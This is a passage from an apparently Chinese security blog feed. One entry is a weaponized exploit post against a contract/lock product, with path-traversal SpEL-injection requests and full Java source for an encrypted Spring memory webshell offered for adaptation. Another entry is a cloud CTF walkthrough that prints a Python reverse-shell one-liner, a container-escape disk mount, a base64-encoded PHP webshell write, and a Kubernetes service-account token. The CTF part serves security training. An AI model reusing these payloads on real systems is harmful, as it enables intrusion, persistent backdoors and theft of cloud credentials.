<pre><code class="language-matlab"># 每种内存马都同时插入冰蝎，哥斯拉，命令回显内存马
# key为 ck4Gr4Qi

# 0.命令回显内存马需要添加http头
Referer:https://www.google.com/ x-client-data:cmd cmd:whoami 
# 1. 冰蝎需要添加http头,密码为ck4Gr4Qi
Referer:https://www.google.com/ x-client-data:rebeyond 
# 2. 哥斯拉需要添加http头,key为ck4Gr4Qi
Referer:https://www.google.com/ x-client-data:godzilla
</code></pre>
<ul>
<li>测试结果如下：</li>
</ul>
<figure data-type="image" tabindex="4"><img src="https://p.ipic.vip/mgq0ip.png" alt="img" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[漏洞利用：某某锁代码执行漏洞实战注入内存马]]></title>
        <id>https://1oecho.github.io/oYmYrVh51/</id>
        <link href="https://1oecho.github.io/oYmYrVh51/">
        </link>
        <updated>2023-11-21T10:35:40.000Z</updated>
        <content type="html"><![CDATA[<h2 id="0x01-漏洞细节">0x01 漏洞细节</h2>
<h3 id="0x01-代码执行">0x01 代码执行</h3>
<ul>
<li><strong>路由：/template/param/edits</strong></li>
</ul>
<figure data-type="image" tabindex="1"><img src="https://p.ipic.vip/mxug19.png" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="2"><img src="https://p.ipic.vip/yd7qh2.png" alt="img" loading="lazy"></figure>
<h3 id="0x02-代码执行-2">0x02 代码执行 2</h3>
<figure data-type="image" tabindex="3"><img src="https://p.ipic.vip/jqhenv.png" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://p.ipic.vip/t171tw.png" alt="img" loading="lazy"></figure>
<ul>
<li>路由1：<strong>/template/html/add</strong></li>
</ul>
<figure data-type="image" tabindex="5"><img src="https://p.ipic.vip/ilmqrg.png" alt="img" loading="lazy"></figure>
<ul>
<li>路由2: <strong>/template/html/update</strong></li>
</ul>
<figure data-type="image" tabindex="6"><img src="https://p.ipic.vip/x05lx1.png" alt="img" loading="lazy"></figure>
<h3 id="0x03-代码执行3">0x03 代码执行3</h3>
<figure data-type="image" tabindex="7"><img src="https://p.ipic.vip/jqx3ec.png" alt="img" loading="lazy"></figure>
<ul>
<li>checkParamExistsWhenSend</li>
</ul>
<figure data-type="image" tabindex="8"><img src="https://p.ipic.vip/dht1c1.png" alt="img" loading="lazy"></figure>
<ul>
<li>checkWordParamExistsWhenSend</li>
</ul>
<figure data-type="image" tabindex="9"><img src="https://cdn.nlark.com/yuque/0/2023/png/2642818/1689337496592-7f02462f-7e00-43d1-8a7b-594afc771b30.png" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="10"><img src="https://p.ipic.vip/kddwog.png" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="11"><img src="https://p.ipic.vip/2zxll7.png" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="12"><img src="https://p.ipic.vip/yiwela.png" alt="img" loading="lazy"></figure>
<ul>
<li>路由： /contract/fillparam</li>
</ul>
<figure data-type="image" tabindex="13"><img src="https://p.ipic.vip/0glizf.png" alt="img" loading="lazy"></figure>
<h2 id="0x02-漏洞利用">0x02 漏洞利用</h2>
<ul>
<li>前台命令执行</li>
</ul>
<pre><code class="language-matlab">POST /contract/ukeysign/.%2e/.%2e/template/param/edits HTTP/1.1
Host: xxxxx
Cookie: SID=3c5dff0a-40d3-4235-b3dc-80a0ede12570
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;113&quot;, &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: &quot;macOS&quot;
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json
Content-Length: 32990
Connection: close

{&quot;id&quot;:&quot;2&quot;,&quot;params&quot;:[{&quot;expression&quot;:&quot;var a=new org.springframework.expression.spel.standard.SpelExpressionParser();var b='classBase64编码';var b64=java.util.Base64.getDecoder();var deStr=new java.lang.String(b64.decode(b),'UTF-8');var c=a.parseExpression(deStr);c.getValue();&quot;}]}
</code></pre>
<ul>
<li>内存马</li>
</ul>
<figure data-type="image" tabindex="14"><img src="https://p.ipic.vip/6p61oa.png" alt="img" loading="lazy"></figure>
<ul>
<li>增加一个 Check-Flag 判断是否注入成功</li>
</ul>
<pre><code class="language-tsx">var classLoader = java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass('SpringLogFlag').newInstance();}catch (e){var clsString = classLoader.loadClass('java.lang.String');var bytecodeRaw = 'byteCode';var bytecode = new java.math.BigInteger(bytecodeRaw,36).toByteArray();var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader');var clsByteArray = (new java.lang.String('a').getBytes().getClass());var clsInt = java.lang.Integer.TYPE;var defineClass = clsClassLoader.getDeclaredMethod('defineClass', [clsByteArray, clsInt, clsInt]);defineClass.setAccessible(true);var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));clazz.newInstance();}
</code></pre>
<p>路径：https://xxxxxxx/login/status</p>
<p><strong>（有些目标环境没有此路径，执行更换其他路径尝试连接）</strong></p>
<ul>
<li>前台绕过-命令执行1</li>
</ul>
<pre><code class="language-c">POST /contract/ukeysign/.%2e/.%2e/template/html/add HTTP/1.1
Host: xxxxxx
Cookie: SID=5ee4f3c3-6494-42db-a97b-ec2c368c6aa4; QID=8b4a2e3d-a057-4a32-be5f-74323c3b535c
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
I18n-Language: zh_CN
X-Qid: 8b4a2e3d-a057-4a32-be5f-74323c3b535c
Referer: 
Content-Type: application/json
Content-Length: 398

{&quot;title&quot;:&quot;1&quot;,
&quot;file&quot;:&quot;1&quot;,
&quot;groupId&quot;:&quot;123&quot;,
&quot;params&quot;:[{&quot;expression&quot;:&quot;var a=new org.springframework.expression.spel.standard.SpelExpressionParser();var b='VChqYXZhLmxhbmcuUnVudGltZSkuZ2V0UnVudGltZSgpLmV4ZWMoJ3BpbmcgOTc2ZDExODQuaXB2Ni4xNDMzLmV1Lm9yZycp';var b64=java.util.Base64.getDecoder();var deStr=new java.lang.String(b64.decode(b),'UTF-8');var c=a.parseExpression(deStr);c.getValue();&quot;}]
</code></pre>
<ul>
<li>前台绕过-命令执行2</li>
</ul>
<pre><code class="language-c">POST /contract/ukeysign/.%2e/.%2e/template/html/update HTTP/1.1
Host: XXXXXXX
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
I18n-Language: zh_CN
Referer: 
Content-Type: application/json
Content-Length: 398

{&quot;title&quot;:&quot;1&quot;,
&quot;file&quot;:&quot;1&quot;,
&quot;groupId&quot;:&quot;123&quot;,
&quot;params&quot;:[{&quot;expression&quot;:&quot;var a=new org.springframework.expression.spel.standard.SpelExpressionParser();var b='VChqYXZhLmxhbmcuUnVudGltZSkuZ2V0UnVudGltZSgpLmV4ZWMoJ3BpbmcgOTc2ZDExODQuaXB2Ni4xNDMzLmV1Lm9yZycp';var b64=java.util.Base64.getDecoder();var deStr=new java.lang.String(b64.decode(b),'UTF-8');var c=a.parseExpression(deStr);c.getValue();&quot;}]
</code></pre>
<h2 id="0x04-武器化实现">0x04 武器化实现</h2>
<ul>
<li>spring内存马,按照你的需求修改增加即可</li>
</ul>
<pre><code class="language-java">import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.tomcat.util.http.Parameters;
import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletRequestWrapper;
import javax.servlet.ServletResponseWrapper;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.*;

public class SpringInterHeaderLog extends HandlerInterceptorAdapter {
    String xc = &quot;8750561e48c1c2a0&quot;;
    String pass = &quot;pass&quot;;
    String md5;
    Class payload;

    public SpringInterHeaderLog() {
        this.md5 = md5(this.pass + this.xc);
    }

    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;

        Class base64;
        try {
            base64 = Class.forName(&quot;java.util.Base64&quot;);
            Object decoder = base64.getMethod(&quot;getDecoder&quot;, (Class[])null).invoke(base64, (Object[])null);
            value = (byte[])((byte[])decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, bs));
        } catch (Exception var6) {
            try {
                base64 = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);
                Object decoder = base64.newInstance();
                value = (byte[])((byte[])decoder.getClass().getMethod(&quot;decodeBuffer&quot;, String.class).invoke(decoder, bs));
            } catch (Exception var5) {
            }
        }

        return value;
    }

    public static String md5(String s) {
        String ret = null;

        try {
            MessageDigest m = MessageDigest.getInstance(&quot;MD5&quot;);
            m.update(s.getBytes(), 0, s.length());
            ret = (new BigInteger(1, m.digest())).toString(16).toUpperCase();
        } catch (Exception var3) {
        }

        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        String value = null;

        Class base64;
        try {
            base64 = Class.forName(&quot;java.util.Base64&quot;);
            Object Encoder = base64.getMethod(&quot;getEncoder&quot;, (Class[])null).invoke(base64, (Object[])null);
            value = (String)Encoder.getClass().getMethod(&quot;encodeToString&quot;, byte[].class).invoke(Encoder, bs);
        } catch (Exception var6) {
            try {
                base64 = Class.forName(&quot;sun.misc.BASE64Encoder&quot;);
                Object Encoder = base64.newInstance();
                value = (String)Encoder.getClass().getMethod(&quot;encode&quot;, byte[].class).invoke(Encoder, bs);
            } catch (Exception var5) {
            }
        }

        return value;
    }

    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) {
        try {
            if (request.getHeader(&quot;check&quot;).equalsIgnoreCase(&quot;true&quot;)) {
                response.setHeader(&quot;X-XSS-Protection&quot;,&quot;1; mode=block;Live;mode=OK&quot;);
            }

            Object lastRequest = request;
            Object lastResponse = response;
            Method getResponse;
            if (!(request instanceof RequestFacade)) {
                getResponse = ServletRequestWrapper.class.getMethod(&quot;getRequest&quot;);
                for(lastRequest = getResponse.invoke(request); !(lastRequest instanceof RequestFacade); lastRequest = getResponse.invoke(lastRequest)) {
                }
            }
            if (!(response instanceof ResponseFacade)) {
                getResponse = ServletResponseWrapper.class.getMethod(&quot;getResponse&quot;);

                for(lastResponse = getResponse.invoke(response); !(lastResponse instanceof ResponseFacade); lastResponse = getResponse.invoke(lastResponse)) {
                }
            }
            URLClassLoader urlClassLoader;
            String payload;
            byte[] data = base64Decode(request.getParameter(this.pass));
            data = this.x(data, false);
            if (this.payload == null) {
                urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
                Method defMethod = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, byte[].class, Integer.TYPE, Integer.TYPE);
                defMethod.setAccessible(true);
                this.payload = (Class)defMethod.invoke(urlClassLoader, data, 0, data.length);
            } else {
                ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                Object f = this.payload.newInstance();
                f.equals(arrOut);
                f.equals(data);
                f.equals(request);
                response.getWriter().write(this.md5.substring(0, 16));
                f.toString();
                response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
                response.getWriter().write(this.md5.substring(16));

            }
        } catch (Exception var20) {
            return false;

        }
        return true;
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance(&quot;AES&quot;);
            c.init(m ? 1 : 2, new SecretKeySpec(this.xc.getBytes(), &quot;AES&quot;));
            return c.doFinal(s);
        } catch (Exception var4) {
            return null;
        }
    }
}
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[云安全: 云安全自建靶场答题记录]]></title>
        <id>https://1oecho.github.io/2EzGQuE0b/</id>
        <link href="https://1oecho.github.io/2EzGQuE0b/">
        </link>
        <updated>2023-11-21T10:08:55.000Z</updated>
        <content type="html"><![CDATA[<h2 id="题目一-云之影shiro的秘密">题目一 云之影：Shiro的秘密</h2>
<h3 id="题目信息">题目信息：</h3>
<ul>
<li>
<p>命令执行</p>
</li>
<li>
<p>信息收集</p>
</li>
<li>
<p>云服务</p>
</li>
</ul>
<h3 id="解题步骤包含关键步骤截图">解题步骤（包含关键步骤截图：）</h3>
<ol>
<li>端口扫描：</li>
</ol>
<figure data-type="image" tabindex="1"><img src="https://p.ipic.vip/z4fk8y.png" alt="img" loading="lazy"></figure>
<p>2.访问8080端口，指纹识别shiro框架，尝试shiro550 反序列化漏洞</p>
<figure data-type="image" tabindex="2"><img src="https://p.ipic.vip/ok65ae.png" alt="img" loading="lazy"></figure>
<p>存在漏洞，漏洞利用成功，获取webshell：</p>
<figure data-type="image" tabindex="3"><img src="https://p.ipic.vip/mbj0fa.png" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://p.ipic.vip/1ol63u.png" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="5"><img src="https://p.ipic.vip/dl05e4.png" alt="img" loading="lazy"></figure>
<p>获取到遗留的配置文件，base64解码：</p>
<figure data-type="image" tabindex="6"><img src="https://p.ipic.vip/y0cq80.png" alt="img" loading="lazy"></figure>
<p>直接访问显示AccesDenied：</p>
<figure data-type="image" tabindex="7"><img src="https://p.ipic.vip/wkjph1.png" alt="img" loading="lazy"></figure>
<p>根据提示猜想，可能设置了权限，只有入口主机能访问，尝试访问，访问成功：</p>
<figure data-type="image" tabindex="8"><img src="https://p.ipic.vip/kr9ihj.png" alt="img" loading="lazy"></figure>
<p>Flag2 获取成功：</p>
<figure data-type="image" tabindex="9"><img src="https://p.ipic.vip/6x6g1j.png" alt="img" loading="lazy"></figure>
<p>信息收集，查看所有有效用户：</p>
<figure data-type="image" tabindex="10"><img src="https://p.ipic.vip/x3o07u.png" alt="img" loading="lazy"></figure>
<p>查看ubuntu用户的用户文件夹, 发现db_old文件夹：</p>
<figure data-type="image" tabindex="11"><img src="https://p.ipic.vip/vvs5ta.png" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="12"><img src="https://p.ipic.vip/tv4oa6.png" alt="img" loading="lazy"></figure>
<p>发现只有数据库名，没有其他信息：</p>
<figure data-type="image" tabindex="13"><img src="https://p.ipic.vip/t89e0i.png" alt="img" loading="lazy"></figure>
<p>查看用户的.bash_history 发现敏感操作：</p>
<figure data-type="image" tabindex="14"><img src="https://p.ipic.vip/p5j56a.png" alt="img" loading="lazy"></figure>
<p>Base64解码获取到密码：</p>
<figure data-type="image" tabindex="15"><img src="https://p.ipic.vip/n1vrqk.png" alt="img" loading="lazy"></figure>
<p>尝试登陆,登陆失败，继续查看.bash_history, 发现另一个端口：</p>
<figure data-type="image" tabindex="16"><img src="https://p.ipic.vip/ryx96c.png" alt="img" loading="lazy"></figure>
<p>登陆成功：</p>
<figure data-type="image" tabindex="17"><img src="https://p.ipic.vip/yplfkm.png" alt="img" loading="lazy"></figure>
<p>获取flag3:</p>
<figure data-type="image" tabindex="18"><img src="https://p.ipic.vip/quyczf.png" alt="img" loading="lazy"></figure>
<h2 id="题目二-云端回响spring的遗憾">题目二 云端回响：Spring的遗憾</h2>
<h3 id="题目信息-2">题目信息：</h3>
<p>Spring 微服务</p>
<p>SDK</p>
<p>腾讯云</p>
<h3 id="解题步骤包含关键步骤截图-2">解题步骤（包含关键步骤截图：）</h3>
<p>端口扫描：</p>
<figure data-type="image" tabindex="19"><img src="https://p.ipic.vip/egjcfg.png" alt="img" loading="lazy"></figure>
<p>访问8080端口， 指纹识别名没有信息：</p>
<figure data-type="image" tabindex="20"><img src="https://p.ipic.vip/4b3549.png" alt="img" loading="lazy"></figure>
<p>尝试目录扫描 获取到目标存在Spring Actuator 未授权访问漏洞，：</p>
<figure data-type="image" tabindex="21"><img src="https://p.ipic.vip/140k43.png" alt="img" loading="lazy"></figure>
<p>访问路径，发现存在gateway，尝试CVE-2022-22947漏洞</p>
<figure data-type="image" tabindex="22"><img src="https://p.ipic.vip/y7tmt1.png" alt="img" loading="lazy"></figure>
<p>Github搜索关键字获取工具：</p>
<p>https://github.com/aodsec/CVE-2022-22947</p>
<p>执行成功：</p>
<figure data-type="image" tabindex="23"><img src="https://p.ipic.vip/lb1nv3.png" alt="img" loading="lazy"></figure>
<p>反弹shell成功：</p>
<figure data-type="image" tabindex="24"><img src="https://p.ipic.vip/29d3kf.png" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="25"><img src="https://p.ipic.vip/bi1iwk.png" alt="img" loading="lazy"></figure>
<p>获取第一个flag：</p>
<figure data-type="image" tabindex="26"><img src="https://p.ipic.vip/leax5l.png" alt="img" loading="lazy"></figure>
<p>信息收集，查看ubuntu用户的.bash_history:</p>
<figure data-type="image" tabindex="27"><img src="https://p.ipic.vip/9qqj89.png" alt="img" loading="lazy"></figure>
<p>执行命令后获取ak和sk：</p>
<figure data-type="image" tabindex="28"><img src="https://p.ipic.vip/sdsi7j.png" alt="img" loading="lazy"></figure>
<p>通过cf利用：</p>
<p>配置ak/sk 选择腾讯云</p>
<figure data-type="image" tabindex="29"><img src="https://p.ipic.vip/9dar49.png" alt="img" loading="lazy"></figure>
<p>接管控制台</p>
<figure data-type="image" tabindex="30"><img src="https://p.ipic.vip/flz57h.png" alt="img" loading="lazy"></figure>
<p>登陆控制台</p>
<p>查看具体资源，对象存储有资源：</p>
<figure data-type="image" tabindex="31"><img src="https://p.ipic.vip/13jltz.png" alt="img" loading="lazy"></figure>
<p>查看cloud-2-flag2对象存储获取flag2:</p>
<figure data-type="image" tabindex="32"><img src="https://p.ipic.vip/9kasfb.png" alt="img" loading="lazy"></figure>
<p>查看cloud-3-flag3对象存储获取flag3</p>
<figure data-type="image" tabindex="33"><img src="https://p.ipic.vip/gnx0i2.png" alt="img" loading="lazy"></figure>
<h2 id="题目三-云端之影docker的双重背叛">题目三 云端之影：Docker的双重背叛</h2>
<h3 id="题目信息-3">题目信息：</h3>
<p>Docker 文件管理 逃逸</p>
<h3 id="解题步骤包含关键步骤截图-3">解题步骤（包含关键步骤截图：）</h3>
<p>端口扫描：</p>
<figure data-type="image" tabindex="34"><img src="https://p.ipic.vip/qq2lgu.png" alt="img" loading="lazy"></figure>
<p>访问80端口：</p>
<figure data-type="image" tabindex="35"><img src="https://p.ipic.vip/el5zdh.png" alt="img" loading="lazy"></figure>
<p>尝试下主页功能，都是无效功能，目录扫描：</p>
<figure data-type="image" tabindex="36"><img src="https://p.ipic.vip/uvsyho.png" alt="img" loading="lazy"></figure>
<p>存在upload.php，访问尝试, 上传php webshell：</p>
<figure data-type="image" tabindex="37"><img src="https://p.ipic.vip/v2bi0g.png" alt="img" loading="lazy"></figure>
<p>冰蝎链接成功，获取Flag1：</p>
<figure data-type="image" tabindex="38"><img src="https://p.ipic.vip/uwo8ko.png" alt="img" loading="lazy"></figure>
<p>信息收集发现发现，当前环境为docker环境无k8s集群：</p>
<figure data-type="image" tabindex="39"><img src="https://p.ipic.vip/ha47ev.png" alt="img" loading="lazy"></figure>
<p>CDK信息收集 存在docker.sock 挂载：</p>
<figure data-type="image" tabindex="40"><img src="https://p.ipic.vip/5e4exa.png" alt="img" loading="lazy"></figure>
<p>反弹shell 手工利用</p>
<figure data-type="image" tabindex="41"><img src="https://p.ipic.vip/ebhjgi.png" alt="img" loading="lazy"></figure>
<p>挂载宿主机根目录。获取宿主机权限，获取flag2：</p>
<figure data-type="image" tabindex="42"><img src="https://p.ipic.vip/9j9r4p.png" alt="img" loading="lazy"></figure>
<p>Docker ps 查看所有容器，发现flag-container-image 镜像的Docker</p>
<p>直接进入对应Docker，获取Flag3</p>
<figure data-type="image" tabindex="43"><img src="https://p.ipic.vip/kxg1zu.png" alt="img" loading="lazy"></figure>
<h2 id="题目四-云端之谜docker的隐藏秘密">题目四 云端之谜：Docker的隐藏秘密</h2>
<h3 id="题目信息-4">题目信息：</h3>
<p>python后门Docker 逃逸</p>
<h3 id="解题步骤包含关键步骤截图-4">解题步骤（包含关键步骤截图：）</h3>
<p>端口扫描：</p>
<figure data-type="image" tabindex="44"><img src="https://p.ipic.vip/zh77py.png" alt="img" loading="lazy"></figure>
<p>访问8080端口：</p>
<figure data-type="image" tabindex="45"><img src="https://p.ipic.vip/cjum2q.png" alt="img" loading="lazy"></figure>
<p>查看页面源代码：</p>
<figure data-type="image" tabindex="46"><img src="https://p.ipic.vip/3awomk.png" alt="img" loading="lazy"></figure>
<p>通过路由获取系统备份：</p>
<figure data-type="image" tabindex="47"><img src="https://p.ipic.vip/9gynlt.png" alt="img" loading="lazy"></figure>
<p>代码审计发现，系统存在命令执行后门：</p>
<figure data-type="image" tabindex="48"><img src="https://p.ipic.vip/6zzdrr.png" alt="img" loading="lazy"></figure>
<p>列目录获取flag1:</p>
<figure data-type="image" tabindex="49"><img src="https://p.ipic.vip/uuv0qf.png" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="50"><img src="https://p.ipic.vip/z9wju3.png" alt="img" loading="lazy"></figure>
<p>信息收集，当前环境为单docker，无k8s集群：</p>
<figure data-type="image" tabindex="51"><img src="https://p.ipic.vip/mpr8z4.png" alt="img" loading="lazy"></figure>
<p>Python环境不能写webshell，我们直接将CDK下载进去：</p>
<figure data-type="image" tabindex="52"><img src="https://p.ipic.vip/yapu6k.png" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="53"><img src="https://p.ipic.vip/ajzqyn.png" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="54"><img src="https://p.ipic.vip/91a6zj.png" alt="img" loading="lazy"></figure>
<p>收集docker信息 发现存在特权，直接利用特权进行逃逸：</p>
<figure data-type="image" tabindex="55"><img src="https://p.ipic.vip/gar1ib.png" alt="img" loading="lazy"></figure>
<p>手工确认：</p>
<figure data-type="image" tabindex="56"><img src="https://p.ipic.vip/uodqie.png" alt="img" loading="lazy"></figure>
<p>反弹一个shell来深入利用</p>
<pre><code class="language-python">python3 -c 'import os,pty,socket;s=socket.socket();s.connect((&quot;xxxxxxx&quot;,9999));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/bash&quot;)'
</code></pre>
<figure data-type="image" tabindex="57"><img src="https://p.ipic.vip/d0cdkf.png" alt="img" loading="lazy"></figure>
<p>挂载宿主机硬盘到docker里</p>
<pre><code class="language-bash">mkdir /tmp/mnt
mount /dev/sda1 /tmp/mnt
cd /tmp/mnt
</code></pre>
<p>查看宿主根目录，获取flag2</p>
<figure data-type="image" tabindex="58"><img src="https://p.ipic.vip/9pztha.png" alt="img" loading="lazy"></figure>
<p>因为我们已经获取了宿主机的硬盘权限，直接搜索flag3关键字，即可从宿主机文件系统，读到另一个docker的文件</p>
<figure data-type="image" tabindex="59"><img src="https://p.ipic.vip/1zm7pn.png" alt="img" loading="lazy"></figure>
<h2 id="题目五-云端迷宫kubernetes之旅">题目五 云端迷宫：Kubernetes之旅</h2>
<h3 id="题目信息-5">题目信息:</h3>
<ul>
<li>
<p>RCE</p>
</li>
<li>
<p>K8s</p>
</li>
<li>
<p>ServiceAccount</p>
</li>
</ul>
<h3 id="解题步骤包含关键步骤截图-5">解题步骤（包含关键步骤截图：）</h3>
<p>直接访问：</p>
<p>http://ngrok.xiaomiqiu123.top:43248/</p>
<p>手工测试后，发现是一个无显的命令执行漏洞：</p>
<figure data-type="image" tabindex="60"><img src="https://p.ipic.vip/94mbyz.png" alt="img" loading="lazy"></figure>
<p>随意输入命令，报错获取到绝对路径，可以直接写入webshell：</p>
<figure data-type="image" tabindex="61"><img src="https://p.ipic.vip/rzsfx8.png" alt="img" loading="lazy"></figure>
<p>直接echo 写入一个冰蝎马：</p>
<pre><code class="language-bash">echo PD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKCWZ1bmN0aW9uIERlY3J5cHQoJGRhdGEpCnsKICAgICRrZXk9ImU0NWUzMjlmZWI1ZDkyNWIiOyAKICAgICRicz0iYmFzZTY0XyIuImRlY29kZSI7CgkkYWZ0ZXI9JGJzKCRkYXRhLiIiKTsKCWZvcigkaT0wOyRpPHN0cmxlbigkYWZ0ZXIpOyRpKyspIHsKICAgIAkkYWZ0ZXJbJGldID0gJGFmdGVyWyRpXV4ka2V5WyRpKzEmMTVdOyAKICAgIH0KICAgIHJldHVybiAkYWZ0ZXI7Cn0KCSRwb3N0PURlY3J5cHQoZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0IikpOwogICAgZXZhbCgkcG9zdCk7Cj8+ | base64 -d &gt; /var/www/html/oooooo.php
</code></pre>
<p>连接成功：</p>
<figure data-type="image" tabindex="62"><img src="https://p.ipic.vip/3p48xr.png" alt="img" loading="lazy"></figure>
<p>搜索flag1:</p>
<figure data-type="image" tabindex="63"><img src="https://p.ipic.vip/pyf6cz.png" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="64"><img src="https://p.ipic.vip/42k4s3.png" alt="img" loading="lazy"></figure>
<p>信息收集, 发现我们目前处于一个k8s的pod当中:</p>
<p>cat /proc/1/cgroup</p>
<figure data-type="image" tabindex="65"><img src="https://p.ipic.vip/km0r12.png" alt="img" loading="lazy"></figure>
<p>查看env信息</p>
<figure data-type="image" tabindex="66"><img src="https://p.ipic.vip/hsklek.png" alt="img" loading="lazy"></figure>
<p>我们查看当前pod的服务账户Token:</p>
<figure data-type="image" tabindex="67"><img src="https://p.ipic.vip/uov0ax.png" alt="img" loading="lazy"></figure>
<pre><code>eyJhbGciOiJSUzI1NiIsImtpZCI6InNUSExVVHNuaVBocTN5eU1mWEtlbTdNRUlzLVRhblM5dDhiZmJuSlJ1d1EifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI5MTA2NjAxLCJpYXQiOjE2OTc1NzA2MDEsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJ3ZWItYXBwLTc3ZmJmNjU3NmItcDR3eGQiLCJ1aWQiOiJlODZiM2I4Zi1iNzlmLTRjMDctODBjZS01Zjk2MmYwOTE0MmQifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6IndlYi1hcHAtc2EiLCJ1aWQiOiJlM2JiOGI4MC02NDk5LTQ1MWItOGZmYi1kNDczMzc0NGQ2MGYifSwid2FybmFmdGVyIjoxNjk3NTc0MjA4fSwibmJmIjoxNjk3NTcwNjAxLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDp3ZWItYXBwLXNhIn0.WtbuPrZpCvttzmBY8BJXzThzBtivxf8GboxNYwpPsMN0XYF5EtA1aGs1hWAWI4zupeV5z-XZWOeulDrkXIB6e1qiMVFvdAZXH6S0O79GlIOd9PwPNgPHDmn3d0Lm1zNFjJN6RVHI50ZvFfZt3W0YuGGnPfEjbX536TWA0DrARV94q976-PtwObjuW-Ef03KRNwTsKCU7x6CoviVidNefwlGmw0w8rkO96dJJqLp97rScy615XkaUrSuT0iHnjXy4iBrXZINcJxSt4SpgKdIdli749YjzN3ivU-iGdbsi6q5S6tehGqAvHJUSdqNOerNhcL0T1eGHcaxBmwAFevzYcA
</code></pre>
<p>先获取Service相关信息：</p>
<figure data-type="image" tabindex="68"><img src="https://p.ipic.vip/jkd54v.png" alt="img" loading="lazy"></figure>
<p>我们通过获取到的token 列一下pod：发现存在utility-pod</p>
